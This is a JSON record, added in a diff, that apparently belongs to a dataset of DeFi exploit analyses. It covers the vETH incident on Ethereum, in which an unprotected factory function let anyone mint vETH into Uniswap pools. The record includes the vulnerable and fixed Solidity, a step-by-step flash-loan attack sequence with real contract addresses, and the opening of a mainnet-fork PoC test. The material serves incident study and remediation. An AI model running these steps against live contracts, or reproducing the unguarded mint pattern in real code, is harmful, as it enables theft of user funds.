@@ -1,0 +1,50 @@
+{
+ "id": "2024__2024-11-14_vETH_PriceDependency_ETH",
+ "source_file": "2024/2024-11-14_vETH_PriceDependency_ETH.md",
+ "title": "vETH — Vulnerable Price Dependency Analysis",
+ "date": "2024-11-14",
+ "protocol": "vETH",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$477,000 (combined across 3 Txs)",
+ "loss_usd": 477000.0,
+ "root_cause": "Factory contract exposed a hidden function allowing anyone to freely inject vETH into Uniswap V2 pools → constant product (x×y=k) inflated → attacker extracted the price difference",
+ "attack_tx": null,
+ "vulnerable_contract": "0x280a...C2E (vETH)",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "// [Unverified contract reverse engineering — source not public]\n// selector: 0x6c0472da\n// parameters: (address vToken, address pairToken, uint256 amount, uint, uint, uint)\n\nfunction injectLiquidityToPool(\n    address vToken,      // vETH address\n    address pairToken,   // BIF / Cowbo / BOVIN, etc.\n    uint256 vETHAmount,  // amount of vETH to inject (PoC: 300 ether)\n    uint256, uint256, uint256\n) external {\n    // ❌ No access control — callable by anyone\n    // ❌ Mints vETH for free and transfers directly to the Uniswap pool\n    IVirtualToken(vToken).mint(uniswapPairAddress, vETHAmount);\n    // ❌ Calls Uniswap sync() to update pool reserves → artificially inflates k value\n    IUniswapV2Pair(uniswapPairAddress).sync();\n    // ❌ Pays caller the BIF/Cowbo/BOVIN difference (via takeLoan mechanism)\n}",
+  "// vETH (VirtualToken) contract\n// ❌ mint function callable without restriction by the Factory contract\nfunction mint(address to, uint256 amount) external {\n    // ❌ No minter whitelist, or the vulnerable Factory is registered as a minter\n    _mint(to, amount);\n}"
+ ],
+ "code_after": [
+  "// ✅ Access control: only protocol governance may call\nmodifier onlyGovernance() {\n    require(msg.sender == governance, \"Not governance\");\n    _;\n}\n\n// ✅ Liquidity injection only allowed through proper deposit/fee flow\nfunction addLiquidityWithFee(\n    address vToken,\n    address pairToken,\n    uint256 vETHAmount\n) external onlyGovernance nonReentrant {\n    // ✅ Receives actual ETH/collateral before minting vETH\n    require(msg.value == requiredCollateral(vETHAmount), \"Insufficient collateral\");\n    IVirtualToken(vToken).mintWithCollateral{value: msg.value}(uniswapPairAddress, vETHAmount);\n    IUniswapV2Pair(uniswapPairAddress).sync();\n}",
+  "// ✅ Minter role managed separately\nmapping(address => bool) public isMinter;\n\nmodifier onlyMinter() {\n    require(isMinter[msg.sender], \"Not a minter\");\n    _;\n}\n\nfunction mint(address to, uint256 amount) external onlyMinter {\n    // ✅ Only approved contracts may mint\n    // ✅ Verify collateral is locked before minting\n    require(collateralLocked[msg.sender] >= amount, \"Insufficient collateral locked\");\n    _mint(to, amount);\n}"
+ ],
+ "steps": [
+  "- No prior approvals needed — Flash loan → swap → exploit executed in a single Tx",
+  "1 | Balancer Vault `flashLoan` — borrow WETH | **5,426.7 WETH**",
+  "2 | `WETH.withdraw` — WETH → ETH conversion | 5,426.7 ETH",
+  "3 | `DEX_INTERFACE.buyQuote(BIF, ...)` — ETH → BIF purchase | ~84,391,389 BIF acquired",
+  "4 | `BIF.approve(VULN_FACTORY, ...)` — approve Factory for BIF | —",
+  "5 | `VULN_FACTORY.call(0x6c0472da, vETH, BIF, 300 ether, ...)` — call vulnerable function | **300 vETH** minted and injected into pool at zero cost → k value inflated",
+  "6 | Inside Factory: vETH injection inflates Uniswap pool k → excess BIF paid out to attacker | Large BIF amount acquired",
+  "7 | `DEX_INTERFACE.sellQuote(BIF, 6,378,941,079..., 0)` — BIF → ETH conversion | ETH secured",
+  "8 | `WETH.deposit` — ETH → WETH | 5,426.7 WETH",
+  "9 | `WETH.transfer(vault, 5,426.7 WETH)` — Flash loan repayment | Profit = price difference",
+  "STEP 1: WETH → ETH conversion",
+  "WETH.withdraw(5,426.7 WETH) → 5,426.7 ETH",
+  "STEP 2: ETH → BIF purchase",
+  "STEP 3: Call Factory vulnerable function [core attack]",
+  "→ 300 vETH injected into Uniswap pool at zero cost",
+  "→ getReserves: vETH ↑, BIF unchanged",
+  "→ k = (vETH_reserve + 300) × BIF_reserve",
+  "→ inflated k pays excess BIF out to attacker",
+  "STEP 4: BIF → ETH sale",
+  "STEP 5: Flash loan repayment"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────────┐\n│  Attacker EOA: 0x713d...9Dd1                                 │\n│  Attack Contract: 0x351d...000C9                             │\n└─────────────────┬───────────────────────────────────────────┘\n                  │ testExploit() call\n                  ▼\n┌─────────────────────────────────────────────────────────────┐\n│  Balancer Vault (0xBA12...)                                  │\n│  flashLoan(WETH, 5,426.7 WETH)                               │\n└─────────────────┬───────────────────────────────────────────┘\n                  │ receiveFlashLoan() callback\n                  ▼\n┌─────────────────────────────────────────────────────────────┐\n│  STEP 1: WETH → ETH conversion                               │\n│  WETH.withdraw(5,426.7 WET",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.15;\n\ncontract vETH_exp is BaseTestWithBalanceLog {\n    uint256 blocknumToForkFrom = 21_184_778 - 1; // fork from block just before attack\n\n    // Related contract constants\n    IBalancerVault constant vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n    IWETH constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));\n    IERC20 constant BIF = IERC20(0xAefEF41f5a0Bb29FE3d1330607B48FBbA55904CE);\n    IERC20 constant vETH = IERC20(0x280A8955A11FcD81D72bA1F99d265A48ce39aC2E);\n    address constant VULN_FACTORY = address(0x62f250CF7021e1CF76C765deC8EC623FE173a1b5); // vulnerable Factory\n    address constant DEX_INTERFACE = address(0x19C5538DF65075d53D6299904636baE68b6dF441);\n\n    function testExp"
+ ]
+}
